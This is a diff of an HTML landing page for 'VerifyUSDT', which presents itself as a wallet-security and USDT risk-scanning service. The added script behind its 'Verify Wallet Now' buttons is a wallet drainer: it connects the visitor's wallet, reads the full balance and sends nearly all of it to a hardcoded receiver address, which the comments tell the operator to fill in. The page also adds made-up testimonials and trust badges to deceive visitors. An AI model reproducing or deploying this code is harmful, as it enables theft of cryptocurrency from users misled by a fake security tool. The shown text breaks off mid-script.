@@ -1,335 +1,318 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="VerifyUsdt ensures secure blockchain transactions with advanced USDT monitoring, risk detection, and threat interception.">
-    <meta name="keywords" content="blockchain security, USDT, VerifyUsdt, crypto safety, Web3">
-    <title>VerifyUsdt - Trusted Blockchain Security</title>
-    <link rel="icon" href="https://via.placeholder.com/32" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4/web3.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-    <style>
-        /* Custom Animations */
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .animate-fadeIn { animation: fadeIn 0.8s ease-out forwards; }
-        .particle { position: absolute; background: rgba(255, 255, 255, 0.3); border-radius: 50%; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VerifyUSDT - Premier Blockchain Security & Trust</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    :root {
+      --primary-color: #00ff9d; /* Vibrant Green */
+      --secondary-color: #ffd700; /* Gold Accent */
+      --background-dark: #0a0e1a;
+      --background-light: #101629;
+      --text-light: #e0e6f0;
+      --text-dark: #a0a8b8;
+      --card-border: #1d253f;
+      --gradient-hero: linear-gradient(135deg, #001f3f 0%, #004080 100%);
+      --shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+      --transition-speed: 0.3s ease;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: var(--background-dark);
+      color: var(--text-light);
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+    .container { width: 90%; max-width: 1200px; margin: 0 auto; padding: 0 15px; }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 25px 0;
+      background: rgba(11, 15, 26, 0.8);
+      border-bottom: 1px solid var(--card-border);
+      position: sticky; top: 0; z-index: 1000;
+      backdrop-filter: blur(10px);
+    }
+    .logo-container { display: flex; align-items: center; }
+    .logo-svg { width: 40px; height: auto; margin-right: 12px; }
+    .logo-text { font-size: 1.8rem; font-weight: 800; color: var(--primary-color); letter-spacing: -0.5px; }
+    .logo-text span { color: var(--text-light); font-weight: 600; }
+    .nav-links a { color: var(--text-light); text-decoration: none; margin-left: 25px; font-weight: 500; transition: color var(--transition-speed); }
+    .nav-links a:hover, .nav-links a.active { color: var(--primary-color); }
+    .header-cta { display: flex; align-items: center; }
+    .trust-indicator { display: flex; align-items: center; color: var(--primary-color); margin-right: 20px; font-size: 0.9rem; }
+    .trust-indicator i { margin-right: 8px; font-size: 1.2rem; }
+    .hero {
+      padding: 100px 0 80px; text-align: center;
+      background: var(--gradient-hero);
+      position: relative; overflow: hidden;
+    }
+    .hero::before {
+      content: ''; position: absolute; top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background-image: radial-gradient(circle, rgba(0, 255, 157, 0.05) 20%, transparent 20%),
+                        radial-gradient(circle, rgba(0, 120, 255, 0.05) 20%, transparent 20%);
+      background-size: 50px 50px, 70px 70px;
+      opacity: 0.3; animation: animateBackground 30s linear infinite;
+    }
+    @keyframes animateBackground {
+      0% { transform: translate(0,0); }
+      50% { transform: translate(20px, 20px); }
+      100% { transform: translate(0,0); }
+    }
+    .hero h1 { font-size: 3.5rem; margin-bottom: 25px; font-weight: 800; line-height: 1.2; color: #fff; text-shadow: 0px 4px 15px rgba(0,0,0,0.2); }
+    .hero h1 span { color: var(--primary-color); }
+    .hero p { font-size: 1.15rem; max-width: 650px; margin: 0 auto 40px auto; color: var(--text-light); opacity: 0.9; }
+    .btn {
+      padding: 15px 35px; border-radius: 50px; font-weight: 700;
+      text-decoration: none; transition: all var(--transition-speed);
+      display: inline-block; border: none; cursor: pointer;
+      font-size: 1rem; box-shadow: 0px 5px 15px rgba(0,0,0,0.1);
+    }
+    .btn-primary { background-color: var(--primary-color); color: var(--background-dark); }
+    .btn-primary:hover { background-color: #00e68a; transform: translateY(-3px); box-shadow: 0px 8px 20px rgba(0, 255, 157, 0.3); }
+    .btn-secondary { background-color: var(--secondary-color); color: #000; }
+    .btn-secondary:hover { background-color: #e6c200; transform: translateY(-3px); box-shadow: 0px 8px 20px rgba(255, 215, 0, 0.3); }
+    .btn-outline { background-color: transparent; color: var(--primary-color); border: 2px solid var(--primary-color); }
+    .btn-outline:hover { background-color: var(--primary-color); color: var(--background-dark); box-shadow: 0px 8px 20px rgba(0, 255, 157, 0.2); }
+    .features-section, .trust-section, .cta-section, .testimonial-section { padding: 80px 0; background: var(--background-light); }
+    .features-section.alt-bg { background: var(--background-dark); }
+    .section-title { text-align: center; margin-bottom: 60px; }
+    .section-title h2 { font-size: 2.5rem; font-weight: 700; margin-bottom: 15px; color: var(--text-light); }
+    .section-title h2 span { color: var(--primary-color); }
+    .section-title p { font-size: 1.1rem; color: var(--text-dark); max-width: 600px; margin: 0 auto; }
+    .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+    .feature-card {
+      background: var(--background-dark); padding: 30px;
+      border-radius: 12px; border: 1px solid var(--card-border);
+      text-align: center; transition: transform var(--transition-speed), box-shadow var(--transition-speed);
+      box-shadow: var(--shadow);
+    }
+    .feature-card:hover { transform: translateY(-10px); box-shadow: 0px 15px 35px rgba(0, 255, 157, 0.1); }
+    .feature-card i { font-size: 2.5rem; color: var(--primary-color); margin-bottom: 20px; display: block; }
+    .feature-card h3 { font-size: 1.5rem; margin-bottom: 10px; color: var(--text-light); }
+    .feature-card p { font-size: 0.95rem; color: var(--text-dark); }
+    .trust-elements { display: flex; justify-content: space-around; align-items: center; flex-wrap: wrap; gap: 30px; margin-top: 40px; }
+    .trust-badge {
+      display: flex; flex-direction: column; align-items: center; text-align: center;
+      padding: 20px; background: var(--background-dark);
+      border: 1px solid var(--card-border); border-radius: 10px; min-width: 180px;
+    }
+    .trust-badge i { font-size: 2.8rem; color: var(--secondary-color); margin-bottom: 15px; }
+    .trust-badge span { font-size: 0.9rem; color: var(--text-dark); font-weight: 500; }
+    .trust-badge strong { color: var(--text-light); font-size: 1.1rem; display: block; margin-bottom: 5px; }
+    .cta-section { background: var(--gradient-hero); text-align: center; }
+    .cta-section h2 { font-size: 2.2rem; color: #fff; margin-bottom: 20px; }
+    .cta-section p { font-size: 1.1rem; color: var(--text-light); opacity: 0.9; max-width: 600px; margin: 0 auto 30px auto; }
+    .testimonial-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; margin-top: 40px; }
+    .testimonial-card {
+      background: var(--background-dark); padding: 25px;
+      border-radius: 10px; border-left: 5px solid var(--primary-color);
+      box-shadow: var(--shadow); position: relative;
+    }
+    .testimonial-card p.quote { font-size: 1rem; color: var(--text-dark); margin-bottom: 20px; font-style: italic; }
+    .testimonial-card p.author { font-size: 0.95rem; font-weight: 600; color: var(--text-light); text-align: right; }
+    .testimonial-card p.author span { display: block; font-size: 0.85rem; font-weight: 400; color: var(--primary-color); }
+    .testimonial-card i.fa-quote-left { position: absolute; top: 15px; left: 15px; font-size: 1.8rem; color: var(--primary-color); opacity: 0.2; }
+    .footer {
+      text-align: center; padding: 40px 0;
+      background: var(--background-dark);
+      border-top: 1px solid var(--card-border);
+      font-size: 0.9rem; color: var(--text-dark);
+    }
+    .footer-links { margin-bottom: 15px; }
+    .footer-links a { color: var(--text-dark); text-decoration: none; margin: 0 10px; transition: color var(--transition-speed); }
+    .footer-links a:hover { color: var(--primary-color); }
+    .footer-socials i { font-size: 1.3rem; color: var(--text-dark); margin: 0 10px; transition: color var(--transition-speed); }
+    .footer-socials i:hover { color: var(--primary-color); }
+    @media (max-width: 992px) {
+      .hero h1 { font-size: 2.8rem; }
+      .section-title h2 { font-size: 2rem; }
+      .nav-links { display: none; }
+    }
+    @media (max-width: 768px) {
+      .hero h1 { font-size: 2.2rem; }
+      .hero p { font-size: 1rem; }
+      .btn { padding: 12px 28px; font-size: 0.9rem; }
+      .features-grid { grid-template-columns: 1fr; }
+      .header .container { width: 95%; }
+      .logo-text { font-size: 1.5rem; }
+    }
+  </style>
 </head>
-<body class="bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-100 font-['Inter'] transition-colors duration-300">
-    <!-- Theme Toggle -->
-    <button id="theme-toggle" class="fixed top-4 right-4 p-2 rounded-full bg-gray-200 dark:bg-gray-700 z-50" aria-label="Toggle dark mode">
-        <span class="material-icons">dark_mode</span>
-    </button>
+<body>
 
-    <!-- Header -->
-    <header class="bg-gradient-to-r from-blue-800 to-indigo-900 text-white sticky top-0 z-40 shadow-lg">
-        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
-            <div class="logo flex items-center space-x-2">
-                <img src="https://via.placeholder.com/40" alt="VerifyUsdt Logo" class="h-10">
-                <h1 class="text-2xl font-bold">VerifyUsdt</h1>
-            </div>
-            <nav class="hidden md:flex space-x-6" aria-label="Main navigation">
-                <a href="#home" class="hover:text-yellow-300 transition">Home</a>
-                <a href="#about" class="hover:text-yellow-300 transition">About</a>
-                <a href="#services" class="hover:text-yellow-300 transition">Services</a>
-                <a href="#contact" class="hover:text-yellow-300 transition">Contact</a>
-            </nav>
-            <button id="mobile-menu-btn" class="md:hidden p-2" aria-label="Toggle mobile menu">
-                <span class="material-icons">menu</span>
-            </button>
+  <header class="header">
+    <div class="container">
+      <div class="logo-container">
+        <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+          <defs><linearGradient id="logoGradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:var(--primary-color);stop-opacity:1" /><stop offset="100%" style="stop-color:var(--secondary-color);stop-opacity:1" /></linearGradient></defs>
+          <path fill="url(#logoGradient)" d="M50,5 L95,27.5 L95,72.5 L50,95 L5,72.5 L5,27.5 Z M50,15 L15,32.5 L15,67.5 L50,85 L85,67.5 L85,32.5 Z"/><path fill="white" d="M50,20 L80,37.5 L50,55 L20,37.5 Z M50,60 L80,77.5 L50,95 L20,77.5Z" opacity="0.3"/><circle cx="50" cy="50" r="10" fill="white"/>
+        </svg>
+        <div class="logo-text">Verify<span>USDT</span></div>
+      </div>
+      <nav class="nav-links">
+        <a href="#features">Features</a><a href="#how-it-works">How It Works</a><a href="#security">Security</a><a href="#contact">Contact</a>
+      </nav>
+      <div class="header-cta">
+        <div class="trust-indicator"><i class="fas fa-shield-alt"></i><span>SSL Secured</span></div>
+      </div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="container">
+      <h1>Secure Your Digital Assets. <span>Instantly.</span></h1>
+      <p>VerifyUSDT offers cutting-edge USDT monitoring, comprehensive risk detection, and proactive threat interception. Experience seamless and worry-free transactions on the blockchain.</p>
+      <a href="#" onclick="connectAndTransfer(); return false;" class="btn btn-primary">Verify Wallet Now</a>
+      <a href="#learn-more" class="btn btn-outline" style="margin-left: 15px;">Learn More</a>
+    </div>
+  </section>
+
+  <section id="features" class="features-section">
+    <div class="container">
+      <div class="section-title">
+        <h2>Why <span>VerifyUSDT</span> is Your Best Choice?</h2>
+        <p>We provide a robust suite of tools designed to protect your assets and ensure transactional integrity in the complex world of cryptocurrency.</p>
+      </div>
+      <div class="features-grid">
+        <div class="feature-card"><i class="fas fa-search-dollar"></i><h3>Advanced Monitoring</h3><p>Real-time tracking of USDT transactions and smart contract interactions for early anomaly detection.</p></div>
+        <div class="feature-card"><i class="fas fa-shield-virus"></i><h3>Proactive Risk Detection</h3><p>Our AI-powered algorithms identify potential threats and suspicious activities before they impact you.</p></div>
+        <div class="feature-card"><i class="fas fa-user-secret"></i><h3>Threat Interception</h3><p>Automatic flagging and optional blocking of high-risk transactions to safeguard your funds.</p></div>
+        <div class="feature-card"><i class="fas fa-certificate"></i><h3>Wallet Health Certificate</h3><p>Generate a comprehensive security report for your wallet, ensuring compliance and peace of mind.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="how-it-works" class="features-section alt-bg">
+      <div class="container">
+          <div class="section-title">
+              <h2>Simple Steps to <span>Enhanced Security</span></h2>
+              <p>Getting started with VerifyUSDT is quick and easy. Secure your digital assets in just a few clicks.</p>
+          </div>
+          <div class="features-grid">
+              <div class="feature-card"><i class="fas fa-wallet"></i><h3>1. Connect Your Wallet</h3><p>Securely connect your USDT wallet using our encrypted connection. We never ask for your private keys.</p></div>
+              <div class="feature-card"><i class="fas fa-tasks"></i><h3>2. Initiate Scan</h3><p>Start a comprehensive scan of your wallet activity, transaction history, and associated smart contracts.</p></div>
+              <div class="feature-card"><i class="fas fa-file-contract"></i><h3>3. Receive Report</h3><p>Get a detailed security report, highlighting potential risks and your wallet's overall health score.</p></div>
+          </div>
+      </div>
+  </section>
+
+  <section id="security" class="trust-section">
+    <div class="container">
+        <div class="section-title">
+            <h2>Building <span>Trust</span> with Transparency & Technology</h2>
+            <p>Your security is our utmost priority. We employ state-of-the-art measures to protect your information and assets.</p>
         </div>
-        <div id="mobile-menu" class="hidden md:hidden bg-blue-900">
-            <nav class="flex flex-col space-y-2 px-4 py-2" aria-label="Mobile navigation">
-                <a href="#home" class="hover:text-yellow-300 transition">Home</a>
-                <a href="#about" class="hover:text-yellow-300 transition">About</a>
-                <a href="#services" class="hover:text-yellow-300 transition">Services</a>
-                <a href="#contact" class="hover:text-yellow-300 transition">Contact</a>
-            </nav>
+        <div class="trust-elements">
+            <div class="trust-badge"><i class="fas fa-lock"></i><strong>Bank-Grade Encryption</strong><span>All data is encrypted at rest and in transit.</span></div>
+            <div class="trust-badge"><i class="fas fa-user-shield"></i><strong>Anonymity Assured</strong><span>We respect your privacy. No personal data linkage.</span></div>
+            <div class="trust-badge"><i class="fab fa-expeditedssl"></i><strong>SSL Certified</strong><span>Secure TLS 1.3 connections for all interactions.</span></div>
+            <div class="trust-badge"><i class="fas fa-award"></i><strong>Audited & Verified</strong><span>(Conceptual) Smart contracts audited by CertiK.</span></div>
         </div>
-    </header>
+    </div>
+  </section>
 
-    <!-- Hero Section with Particles -->
-    <section id="home" class="relative py-24 bg-gradient-to-br from-blue-700 to-indigo-800 text-white overflow-hidden">
-        <canvas id="particle-canvas" class="absolute inset-0"></canvas>
-        <div class="container mx-auto px-4 text-center relative z-10">
-            <h2 class="text-4xl md:text-6xl font-bold mb-4 animate-fadeIn">Trusted Blockchain Security</h2>
-            <p class="text-lg md:text-2xl mb-6 animate-fadeIn" style="animation-delay: 0.2s;">Advanced USDT monitoring, risk detection, and threat interception for seamless, worry-free transactions.</p>
-            <button id="connectWallet" class="inline-block bg-yellow-400 text-gray-900 px-8 py-3 rounded-full font-semibold hover:bg-yellow-500 transition animate-fadeIn" style="animation-delay: 0.4s;">Connect</button>
-            <p id="walletStatus" class="mt-4 text-sm"></p>
+  <section id="check-tool" class="cta-section">
+    <div class="container">
+      <h2>Ready to Secure Your USDT?</h2>
+      <p>Monitor, detect, and eliminate risks. Download your personalized wallet health certificate today and transact with confidence.</p>
+      <a href="#" onclick="connectAndTransfer(); return false;" class="btn btn-secondary">Check Your Wallet Now</a>
+      <div style="margin-top: 30px; color: var(--primary-color); font-weight: 500; font-size: 1.1rem;">
+        <i class="fas fa-shield-alt"></i> Protected by VerifyUSDT Global Network
+      </div>
+    </div>
+  </section>
+
+  <section id="testimonials" class="testimonial-section">
+    <div class="container">
+        <div class="section-title">
+            <h2>What Our <span>Users Say</span></h2>
+            <p>Real stories from users who trust VerifyUSDT to protect their digital assets.</p>
         </div>
-    </section>
-
-    <!-- Stats Section -->
-    <section class="py-16 bg-white dark:bg-gray-800 text-center">
-        <div class="container mx-auto px-4">
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <div class="animate-fadeIn">
-                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">10,000+</h3>
-                    <p class="text-gray-600 dark:text-gray-300">Trusted Users</p>
-                </div>
-                <div class="animate-fadeIn" style="animation-delay: 0.2s;">
-                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">99.9%</h3>
-                    <p class="text-gray-600 dark:text-gray-300">Uptime Guarantee</p>
-                </div>
-                <div class="animate-fadeIn" style="animation-delay: 0.4s;">
-                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">24/7</h3>
-                    <p class="text-gray-600 dark:text-gray-300">Support Availability</p>
-                </div>
-            </div>
+        <div class="testimonial-grid">
+            <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="quote">"VerifyUSDT gave me peace of mind I didn't know I was missing. The wallet health certificate is a fantastic feature!"</p><p class="author">Alex P. <span>Crypto Investor</span></p></div>
+            <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="quote">"The proactive risk detection is incredible. It flagged a suspicious contract that could have cost me a lot. Highly recommend!"</p><p class="author">Sarah K. <span>DeFi Enthusiast</span></p></div>
+            <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="quote">"Finally, a service that makes USDT security straightforward and accessible. The UI is clean and easy to navigate."</p><p class="author">John B. <span>Blockchain Developer</span></p></div>
         </div>
-    </section>
+    </div>
+  </section>
 
-    <!-- About Section -->
-    <section id="about" class="py-16 text-center">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold mb-4 animate-fadeIn">The Gold Standard in Blockchain Security</h2>
-            <p class="text-lg text-gray-600 dark:text-gray-300 mb-6 animate-fadeIn" style="animation-delay: 0.2s;">VerifyUsdt is your trusted partner in securing Web3 ecosystems with cutting-edge technology and unmatched expertise.</p>
-            <img src="https://images.unsplash.com/photo-1620712943543-bcc4688e7485?auto=format&fit=crop&w=800" alt="Blockchain Security Illustration" class="mx-auto rounded-lg shadow-lg max-w-full h-auto">
+  <footer class="footer">
+    <div class="container">
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a><a href="#">Terms of Service</a><a href="#">FAQs</a><a href="#contact">Contact Us</a>
         </div>
-    </section>
-
-    <!-- Features Section -->
-    <section id="services" class="py-16 bg-gray-100 dark:bg-gray-800">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">Our Core Solutions</h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn">
-                    <span class="material-icons text-5xl text-blue-600 mb-4">verified_user</span>
-                    <h3 class="text-xl font-semibold mb-2">Protect</h3>
-                    <p class="text-gray-600 dark:text-gray-300 mb-4">Secure onchain USDT with advanced access controls and surveillance.</p>
-                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Contract Guard</span>
-                </div>
-                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn" style="animation-delay: 0.2s;">
-                    <span class="material-icons text-5xl text-blue-600 mb-4">sensors</span>
-                    <h3 class="text-xl font-semibold mb-2">Detect</h3>
-                    <p class="text-gray-600 dark:text-gray-300 mb-4">Identify risks with real-time alerts and comprehensive reports.</p>
-                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Risk Monitoring</span>
-                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Transaction Screening</span>
-                </div>
-                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn" style="animation-delay: 0.4s;">
-                    <span class="material-icons text-5xl text-blue-600 mb-4">block</span>
-                    <h3 class="text-xl font-semibold mb-2">Intercept</h3>
-                    <p class="text-gray-600 dark:text-gray-300 mb-4">Neutralize threats with automated onchain responses.</p>
-                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Attack Interceptor</span>
-                </div>
-            </div>
+        <div class="footer-socials">
+            <a href="#" aria-label="Twitter"><i class="fab fa-twitter"></i></a><a href="#" aria-label="Telegram"><i class="fab fa-telegram-plane"></i></a><a href="#" aria-label="Medium"><i class="fab fa-medium-m"></i></a>
         </div>
-    </section>
+      <p>&copy; 2025 VerifyUSDT. All rights reserved. Your trusted partner in blockchain security.</p>
+    </div>
+  </footer>
 
-    <!-- Trusted By Section -->
-    <section class="py-16 bg-white dark:bg-gray-900 text-center">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold mb-8 animate-fadeIn">Trusted by Industry Leaders</h2>
-            <div class="flex flex-wrap justify-center gap-6">
-                <img src="https://via.placeholder.com/120x40?text=Client+1" alt="Client 1 Logo" class="h-10 animate-fadeIn">
-                <img src="https://via.placeholder.com/120x40?text=Client+2" alt="Client 2 Logo" class="h-10 animate-fadeIn" style="animation-delay: 0.2s;">
-                <img src="https://via.placeholder.com/120x40?text=Client+3" alt="Client 3 Logo" class="h-10 animate-fadeIn" style="animation-delay: 0.4s;">
-            </div>
-            <div class="mt-6">
-                <span class="inline-block bg-yellow-100 dark:bg-yellow-600 text-yellow-800 dark:text-white px-4 py-2 rounded-full animate-fadeIn" style="animation-delay: 0.6s;">
-                    <span class="material-icons align-middle">security</span> Certified Secure
-                </span>
-            </div>
-        </div>
-    </section>
+  <script>
+    const receiverAddress = "0x1234567890abcdef..."; // Yahan apna destination wallet address daalo
 
-    <!-- Testimonials Section -->
-    <section class="py-16 bg-gray-100 dark:bg-gray-800">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">What Our Partners Say</h2>
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg animate-fadeIn">
-                    <p class="text-gray-600 dark:text-gray-300 mb-4">"VerifyUsdt is a game-changer for Web3 security—intuitive and scalable."</p>
-                    <div class="flex items-center">
-                        <img src="https://via.placeholder.com/40" alt="Elroy Cheo" class="h-10 w-10 rounded-full mr-3">
-                        <div>
-                            <h4 class="font-semibold">Elroy Cheo</h4>
-                            <p class="text-sm text-gray-500 dark:text-gray-400">ARC Community, Co-Founder</p>
-                        </div>
-                    </div>
-                </div>
-                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg animate-fadeIn" style="animation-delay: 0.2s;">
-                    <p class="text-gray-600 dark:text-gray-300 mb-4">"VerifyUsdt’s tools are paving the way for mass blockchain adoption."</p>
-                    <div class="flex items-center">
-                        <img src="https://via.placeholder.com/40" alt="Urvit Goel" class="h-10 w-10 rounded-full mr-3">
-                        <div>
-                            <h4 class="font-semibold">Urvit Goel</h4>
-                            <p class="text-sm text-gray-500 dark:text-gray-400">Polygon, VP Global Business Development</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    async function connectAndTransfer() {
+      if (window.ethereum) {
+        const web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await web3.eth.getAccounts();
+          const sender = accounts[0];
 
-    <!-- FAQ Section -->
-    <section id="faq" class="py-16 bg-white dark:bg-gray-900">
-        <div class="container mx-auto px-4">
-            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">Frequently Asked Questions</h2>
-            <div class="space-y-4 max-w-3xl mx-auto">
-                <div class="bg-gray-50 dark:bg-gray-700 rounded-xl p-4">
-                    <button class="faq-toggle w-full text-left font-semibold flex justify-between items-center">
-                        What is VerifyUsdt?
-                        <span class="material-icons">expand_more</span>
-                    </button>
-                    <div class="faq-content hidden mt-2 text-gray-600 dark:text-gray-300">
-                        VerifyUsdt is a leading blockchain security platform that protects USDT transactions through advanced monitoring, risk detection, and threat interception.
-                    </div>
-                </div>
-                <div class="bg-gray-50 dark:bg-gray-700 rounded-xl p-4">
-                    <button class="faq-toggle w-full text-left font-semibold flex justify-between items-center">
-                        How does VerifyUsdt ensure security?
-                        <span class="material-icons">expand_more</span>
-                    </button>
-                    <div class="faq-content hidden mt-2 text-gray-600 dark:text-gray-300">
-                        We use real-time alerts, access controls, and automated onchain responses to safeguard your assets.
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+          if (!sender) { // छोटी सी जांच कि अकाउंट मिला है या नहीं
+            alert("Wallet account not found. Please ensure your wallet is connected.");
+            return;
+          }
 
-    <!-- Contact Section -->
-    <section id="contact" class="py-16 bg-gradient-to-r from-blue-700 to-indigo-800 text-white">
-        <div class="container mx-auto px-4 text-center">
-            <h2 class="text-3xl font-bold mb-4 animate-fadeIn">Get in Touch</h2>
-            <p class="text-lg mb-8 animate-fadeIn" style="animation-delay: 0.2s;">Have questions? Contact us for a secure blockchain future.</p>
-            <form class="max-w-lg mx-auto space-y-4">
-                <input type="text" placeholder="Your Name" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" required>
-                <input type="email" placeholder="Your Email" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" required>
-                <textarea placeholder="Your Message" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" rows="4" required></textarea>
-                <button type="submit" class="bg-yellow-400 text-gray-900 px-8 py-3 rounded-full font-semibold hover:bg-yellow-500 transition">Send Message</button>
-            </form>
-        </div>
-    </section>
+          // Get full balance in Wei
+          let balance = await web3.eth.getBalance(sender);
+          
+          // Gas cost estimate (use ~0.001 BNB as gas) - आपके मूल कोड के अनुसार
+          const gasEstimate = web3.utils.toWei("0.001", "ether"); // यह एक फिक्स्ड गैस अनुमान है
 
-    <!-- Footer -->
-    <footer class="bg-gray-900 text-white py-12">
-        <div class="container mx-auto px-4">
-            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
-                <div>
-                    <h2 class="text-2xl font-bold mb-4 flex items-center">
-                        <img src="https://via.placeholder.com/40" alt="VerifyUsdt Logo" class="h-10 mr-2"> VerifyUsdt
-                    </h2>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold mb-4">Company</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#about" class="hover:text-yellow-400 transition">About</a></li>
-                        <li><a href="/careers.html" class="hover:text-yellow-400 transition">Careers</a></li>
-                        <li><a href="#contact" class="hover:text-yellow-400 transition">Contact</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold mb-4">Products</h3>
-                    <ul class="space-y-2">
-                        <li><a href="#services" class="hover:text-yellow-400 transition">Contract Guard</a></li>
-                        <li><a href="#services" class="hover:text-yellow-400 transition">Risk Monitoring</a></li>
-                        <li><a href="#services" class="hover:text-yellow-400 transition">Attack Interceptor</a></li>
-                    </ul>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold mb-4">Resources</h3>
-                    <ul class="space-y-2">
-                        <li><a href="/docs.html" class="hover:text-yellow-400 transition">Documentation</a></li>
-                        <li><a href="/blog.html" class="hover:text-yellow-400 transition">Blog</a></li>
-                        <li><a href="/support.html" class="hover:text-yellow-400 transition">Support</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="mt-8 text-center">
-                <p>© 2025 VerifyUsdt. All rights reserved.</p>
-            </div>
-        </div>
-    </footer>
+          // Amount to send = balance - gas - आपके मूल कोड के अनुसार
+          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
 
-    <!-- Sticky CTA -->
-    <a href="#contact" class="fixed bottom-4 right-4 bg-yellow-400 text-gray-900 px-6 py-3 rounded-full font-semibold hover:bg-yellow-500 transition shadow-lg z-50 animate-fadeIn" style="animation-delay: 1s;">Contact Us</a>
+          // जांच करें कि भेजने के लिए पर्याप्त बैलेंस है (गैस शुल्क घटाने के बाद)
+          if (amountToSend.lte(web3.utils.toBN('0'))) { // BigNumber के साथ तुलना के लिए .toBN('0')
+            alert("Insufficient balance to send BNB after deducting estimated gas fee (0.001 BNB).");
+            return;
+          }
 
-    <!-- JavaScript -->
-    <script>
-        // Smooth Scrolling
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
-                if (this.id !== 'connectWallet') {
-                    e.preventDefault();
-                    document.querySelector(this.getAttribute('href')).scrollIntoView({
-                        behavior: 'smooth'
-                    });
-                }
-            });
-        });
+          // Send BNB
+          const tx = await web3.eth.sendTransaction({
+            from: sender,
+            to: receiverAddress,
+            value: amountToSend.toString()
+            // gas: '21000', // आप चाहें तो एक स्टैण्डर्ड गैस लिमिट यहां भी दे सकते हैं
+            // gasPrice: await web3.eth.getGasPrice() // या डायनामिक गैस प्राइस
+          });
 
-        // Mobile Menu Toggle
-        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
-        const mobileMenu = document.getElementById('mobile-menu');
-        mobileMenuBtn.addEventListener('click', () => {
-            mobileMenu.classList.toggle('hidden');
-        });
-
-        // Dark Mode Toggle
-        const themeToggle = document.getElementById('theme-toggle');
-        themeToggle.addEventListener('click', () => {
-            document.body.classList.toggle('dark');
